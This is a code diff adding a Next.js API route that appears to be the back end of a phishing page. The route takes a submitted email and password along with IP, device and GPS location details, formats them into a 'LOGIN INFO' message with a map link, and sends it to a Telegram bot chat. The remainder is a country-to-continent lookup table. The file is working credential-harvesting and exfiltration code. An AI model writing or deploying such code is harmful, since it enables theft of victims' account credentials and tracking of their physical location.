@@ -1,0 +1,318 @@
+import { type NextRequest, NextResponse } from "next/server"
+
+export async function POST(request: NextRequest) {
+  try {
+    const { email, password, deviceInfo, locationInfo, ipInfo } = await request.json()
+
+    // Telegram Bot configuration
+    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
+    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID
+
+    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+      console.error("Telegram credentials not configured")
+      return NextResponse.json({ success: false, error: "Configuration error" })
+    }
+
+    let message = `~~~~[ 𝗟𝗢𝗚𝗜𝗡 𝗜𝗡𝗙𝗢 ]~~~~
+𝗘𝗺𝗮𝗶𝗹: ${email}
+𝗣𝗮𝘀𝘀𝘄𝗼𝗿𝗱: ${password}
+~~~~[ 𝗕𝗥𝗢𝗪𝗦𝗘𝗥 𝗜𝗡𝗙𝗢 ]~~~~
+𝗜𝗣 𝗔𝗱𝗱𝗿𝗲𝘀𝘀: ${ipInfo?.ip || "Unknown"}
+𝗥𝗲𝗴𝗶𝗼𝗻: ${ipInfo?.region || "Unknown"}
+𝗖𝗶𝘁𝘆: ${ipInfo?.city || "Unknown"}
+𝗖𝗼𝗻𝘁𝗶𝗻𝗲𝗻𝘁: ${getContinent(ipInfo?.countryCode) || "Unknown"}
+𝗧𝗶𝗺𝗲𝘇𝗼𝗻𝗲: ${ipInfo?.timezone || deviceInfo?.timezone || "Unknown"}
+𝗢𝗦/𝗕𝗿𝗼𝘄𝘀𝗲𝗿: ${deviceInfo?.os || "Unknown"}/${deviceInfo?.browser || "Unknown"}
+𝗗𝗮𝘁𝗲: ${new Date().toLocaleString()}
+𝗨𝘀𝗲𝗿 𝗔𝗴𝗲𝗻𝘁: ${deviceInfo?.userAgent || "Unknown"}
+~~~~[ 𝗘𝗡𝗗 𝗢𝗙 𝗟𝗜𝗡𝗘 ]~~~~`
+
+    // Add GPS coordinates if available
+    if (locationInfo && locationInfo.latitude && locationInfo.longitude) {
+      message += `
+
+🎯 GPS: ${locationInfo.latitude.toFixed(6)}, ${locationInfo.longitude.toFixed(6)}
+🗺️ Maps: https://maps.google.com/?q=${locationInfo.latitude},${locationInfo.longitude}`
+    }
+
+    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
+
+    const response = await fetch(telegramUrl, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: "HTML",
+      }),
+    })
+
+    if (response.ok) {
+      return NextResponse.json({ success: true })
+    } else {
+      console.error("Failed to send to Telegram:", await response.text())
+      return NextResponse.json({ success: false, error: "Failed to send message" })
+    }
+  } catch (error) {
+    console.error("Error sending to Telegram:", error)
+    return NextResponse.json({ success: false, error: "Server error" })
+  }
+}
+
+// Add helper function for continent detection
+function getContinent(countryCode: string): string {
+  const continents: { [key: string]: string } = {
+    AD: "Europe",
+    AE: "Asia",
+    AF: "Asia",
+    AG: "North America",
+    AI: "North America",
+    AL: "Europe",
+    AM: "Asia",
+    AO: "Africa",
+    AQ: "Antarctica",
+    AR: "South America",
+    AS: "Oceania",
+    AT: "Europe",
+    AU: "Oceania",
+    AW: "North America",
+    AX: "Europe",
+    AZ: "Asia",
+    BA: "Europe",
+    BB: "North America",
+    BD: "Asia",
+    BE: "Europe",
+    BF: "Africa",
+    BG: "Europe",
+    BH: "Asia",
+    BI: "Africa",
+    BJ: "Africa",
+    BL: "North America",
+    BM: "North America",
+    BN: "Asia",
+    BO: "South America",
+    BQ: "North America",
+    BR: "South America",
+    BS: "North America",
+    BT: "Asia",
+    BV: "Antarctica",
+    BW: "Africa",
+    BY: "Europe",
+    BZ: "North America",
+    CA: "North America",
+    CC: "Asia",
+    CD: "Africa",
+    CF: "Africa",
+    CG: "Africa",
+    CH: "Europe",
+    CI: "Africa",
+    CK: "Oceania",
+    CL: "South America",
+    CM: "Africa",
+    CN: "Asia",
+    CO: "South America",
+    CR: "North America",
+    CU: "North America",
+    CV: "Africa",
+    CW: "North America",
+    CX: "Asia",
+    CY: "Europe",
+    CZ: "Europe",
+    DE: "Europe",
+    DJ: "Africa",
+    DK: "Europe",
+    DM: "North America",
+    DO: "North America",
+    DZ: "Africa",
+    EC: "South America",
+    EE: "Europe",
+    EG: "Africa",
+    EH: "Africa",
+    ER: "Africa",
+    ES: "Europe",
+    ET: "Africa",
+    FI: "Europe",
+    FJ: "Oceania",
+    FK: "South America",
+    FM: "Oceania",
+    FO: "Europe",
+    FR: "Europe",
+    GA: "Africa",
+    GB: "Europe",
+    GD: "North America",
+    GE: "Asia",
+    GF: "South America",
+    GG: "Europe",
+    GH: "Africa",
+    GI: "Europe",
+    GL: "North America",
+    GM: "Africa",
+    GN: "Africa",
+    GP: "North America",
+    GQ: "Africa",
+    GR: "Europe",
+    GS: "Antarctica",
+    GT: "North America",
+    GU: "Oceania",
+    GW: "Africa",
+    GY: "South America",
+    HK: "Asia",
+    HM: "Antarctica",
+    HN: "North America",
+    HR: "Europe",
+    HT: "North America",
+    HU: "Europe",
+    ID: "Asia",
+    IE: "Europe",
+    IL: "Asia",
+    IM: "Europe",
+    IN: "Asia",
+    IO: "Asia",
+    IQ: "Asia",
+    IR: "Asia",
+    IS: "Europe",
+    IT: "Europe",
+    JE: "Europe",
+    JM: "North America",
+    JO: "Asia",
+    JP: "Asia",
+    KE: "Africa",
+    KG: "Asia",
+    KH: "Asia",
+    KI: "Oceania",
+    KM: "Africa",
+    KN: "North America",
+    KP: "Asia",
+    KR: "Asia",
+    KW: "Asia",
+    KY: "North America",
+    KZ: "Asia",
+    LA: "Asia",
+    LB: "Asia",
+    LC: "North America",
+    LI: "Europe",
+    LK: "Asia",
+    LR: "Africa",
+    LS: "Africa",
+    LT: "Europe",
+    LU: "Europe",
+    LV: "Europe",
+    LY: "Africa",
+    MA: "Africa",
+    MC: "Europe",
+    MD: "Europe",
+    ME: "Europe",
+    MF: "North America",
+    MG: "Africa",
+    MH: "Oceania",
+    MK: "Europe",
+    ML: "Africa",
+    MM: "Asia",
+    MN: "Asia",
+    MO: "Asia",
+    MP: "Oceania",
+    MQ: "North America",
+    MR: "Africa",
+    MS: "North America",
+    MT: "Europe",
+    MU: "Africa",
+    MV: "Asia",
+    MW: "Africa",
+    MX: "North America",
+    MY: "Asia",
+    MZ: "Africa",
+    NA: "Africa",
+    NC: "Oceania",
+    NE: "Africa",
+    NF: "Oceania",
+    NG: "Africa",
+    NI: "North America",
+    NL: "Europe",
+    NO: "Europe",
+    NP: "Asia",
+    NR: "Oceania",
+    NU: "Oceania",
+    NZ: "Oceania",
+    OM: "Asia",
+    PA: "North America",
+    PE: "South America",
+    PF: "Oceania",
+    PG: "Oceania",
+    PH: "Asia",
+    PK: "Asia",
+    PL: "Europe",
+    PM: "North America",
+    PN: "Oceania",
+    PR: "North America",
+    PS: "Asia",
+    PT: "Europe",
+    PW: "Oceania",
+    PY: "South America",
+    QA: "Asia",
+    RE: "Africa",
+    RO: "Europe",
+    RS: "Europe",
+    RU: "Europe",
+    RW: "Africa",
+    SA: "Asia",
+    SB: "Oceania",
+    SC: "Africa",
+    SD: "Africa",
+    SE: "Europe",
+    SG: "Asia",
+    SH: "Africa",
+    SI: "Europe",
+    SJ: "Europe",
+    SK: "Europe",
+    SL: "Africa",
+    SM: "Europe",
+    SN: "Africa",
+    SO: "Africa",
+    SR: "South America",
+    SS: "Africa",
+    ST: "Africa",
+    SV: "North America",
+    SX: "North America",
+    SY: "Asia",
+    SZ: "Africa",
+    TC: "North America",
+    TD: "Africa",
+    TF: "Antarctica",
+    TG: "Africa",
+    TH: "Asia",
+    TJ: "Asia",
+    TK: "Oceania",
+    TL: "Asia",
+    TM: "Asia",
+    TN: "Africa",
+    TO: "Oceania",
+    TR: "Asia",
+    TT: "North America",
+    TV: "Oceania",
+    TW: "Asia",
+    TZ: "Africa",
+    UA: "Europe",
+    UG: "Africa",
+    UM: "Oceania",
+    US: "North America",
+    UY: "South America",
+    UZ: "Asia",
+    VA: "Europe",
+    VC: "North America",
+    VE: "South America",
+    VG: "North America",
+    VI: "North America",
+    VN: "Asia",
+    VU: "Oceania",
+    WF: "Oceania",
+    WS: "Oceania",
+    YE: "Asia",
+    YT: "Africa",
+    ZA: "Africa",
+    ZM: "Africa",
+    ZW: "Africa",
+  }
+  return continents[countryCode] || "Unknown"
+}
